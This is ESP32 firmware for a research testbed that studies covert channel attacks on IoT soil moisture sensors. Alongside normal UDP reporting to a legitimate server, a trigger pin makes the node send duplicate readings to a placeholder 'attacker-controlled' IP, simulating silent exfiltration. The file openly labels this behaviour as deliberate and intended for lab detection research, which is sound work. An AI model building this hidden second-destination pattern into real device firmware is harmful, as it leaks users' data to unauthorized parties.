/*
 * ============================================================================
 * Soil Moisture Sensor Node — Covert Channel Attack (CCA) Testbed Firmware
 * ============================================================================
 *
 * PURPOSE:
 *   This firmware implements an ESP32-based soil moisture sensor node used
 *   as a research testbed for studying CCA in IoT agricultural sensing networks. 
 *   It is based on / accompanies the published research papers' DOIs 
     (10.1109/ACCESS.2025.3626798 and 10.1109/HONET67928.2025.11318504).
 *
 *   In NORMAL operation, the node reads soil moisture and reports it over
 *   UDP to a legitimate server (SERVER_IP). When manually/autonomously the attack is 
 *   is triggred at the (CCA_SWITCH_PIN), the node ALSO transmits a
 *   second, identical-looking packet to a separate, attacker-controlled
 *   endpoint (SERVER_IP_Attack). This simulates a compromised sensor node
 *   silently exfiltrating data to an unauthorized party - a covert channel.
 *
 *   IMPORTANT: This is intentionally vulnerable / malicious-behavior
 *   firmware built for controlled security research and demonstration
 *   purposes ONLY. The attack trigger here is based upon receiving a LOW (GND)     
 *   signal from solid state relay (SSR) module that is connected to the GND 
 *   of the ESP32, chosen for reproducibility in the lab setting. 
 *   
 * THREAT MODEL:
 *   - Legitimate channel: ESP32 -> SERVER_IP (trusted monitoring server)
 *   - Covert channel:     ESP32 -> SERVER_IP_Attack (adversary-controlled)
 *   - Trigger:            CCA_SWITCH_PIN pulled LOW (manually/autonomously, for demo repeatability)
 *
 * ============================================================================
 */

#include <WiFi.h>
#include <WiFiUdp.h>

// ---------------------------------------------------------------------------
// Pin configuration
// ---------------------------------------------------------------------------
#define SOIL_MOISTURE_PIN 33  // Analog input from capacitive soil moisture sensor
#define CCA_SWITCH_PIN 32     // Manual/Autonomous trigger pin for the covert channel attack demo

// ---------------------------------------------------------------------------
// Network configuration
// ---------------------------------------------------------------------------
#define SERVER_PORT 12345           // UDP port used for both legitimate and covert traffic
#define SERVER_IP "x.x.x.x"         // Legitimate server: trusted destination IP address
#define SERVER_IP_Attack "x.x.x.x"  // Adversary server: covert/unauthorized destination IP address

const char *ssid = "xxx";      // Wi-Fi SSID — replace with your testbed network
const char *password = "xxx";  // Wi-Fi password — replace with your testbed network credentials

// ---------------------------------------------------------------------------
// ADC / sensor calibration
// ---------------------------------------------------------------------------
// ESP32 ADC resolution is 12-bit (0-4095).
#define ADC_MAX_VALUE 4095

WiFiUDP udp;

// ---------------------------------------------------------------------------
// Reads the soil moisture sensor and converts it to a 0-100% scale.
// Centralized here so both the legitimate loop() and the attack function use identical logic.
// ---------------------------------------------------------------------------
int readSoilMoisturePercent() {
  int rawValue = analogRead(SOIL_MOISTURE_PIN);
  int moisturePercent = abs(((rawValue * 100) / ADC_MAX_VALUE) - 100);
  return moisturePercent;
}

// ---------------------------------------------------------------------------
// Covert Channel Attack (CCA)
// Simulates a compromised node silently duplicating sensor data to an
// unauthorized, attacker-controlled server.
// ---------------------------------------------------------------------------
void startCCAAttack() {
  Serial.println("Covert Channel Attack Enabled...");
  // Uncomment this to amplify the power-consumption signature for attack detection if needed instead of using only the external operational amplifier (OP-AMP) circuit.
  //setCpuFrequencyMhz(XX);

  int moisturePercent = readSoilMoisturePercent();
  String data = "Soil Moisture: " + String(moisturePercent);

  // Sending to the attacker-controlled receiver — this is the unauthorized
  // covert channel, separate from the legitimate SERVER_IP destination.
  udp.beginPacket(SERVER_IP_Attack, SERVER_PORT);
  udp.print(data);
  udp.endPacket();

  Serial.println("[CCA] Soil Moisture Packet Sent to attacker endpoint: " + data);
}

void setup() {
  Serial.begin(115200);

  // Sensor and trigger pin setup
  pinMode(SOIL_MOISTURE_PIN, INPUT);
  pinMode(CCA_SWITCH_PIN, INPUT_PULLUP);  // Active-LOW attack trigger

  // Connect to Wi-Fi
  WiFi.begin(ssid, password);
  while (WiFi.status() != WL_CONNECTED) {
    delay(1000);
    Serial.print(".");
  }
  Serial.println("Connected to Wi-Fi");

  // Initialize UDP socket (port 0 = let the OS/stack auto-assign a local port)
  udp.begin(0);
}

void loop() {
  setCpuFrequencyMhz(80);  // Fixed baseline so any frequency change during
                           // startCCAAttack() produces a measurable power-draw signature

  // --- Legitimate channel: normal sensor reporting ---
  int moisturePercent = readSoilMoisturePercent();
  String data = "Soil Moisture: " + String(moisturePercent);

  Serial.println("Soil Moisture Packet Sent: " + data);
  udp.beginPacket(SERVER_IP, SERVER_PORT);
  udp.print(data);
  udp.endPacket();

  // --- Attack trigger check ---
  // If the CCA_SWITCH_PIN was pulled LOW (manually or by the autonomous trigger circuit), this would start the covert channel attack.
  if (digitalRead(CCA_SWITCH_PIN) == LOW) {
    delay(400);  // avoids switch/relay bounce on the trigger signal
    startCCAAttack();
  }

  delay(2000);
}
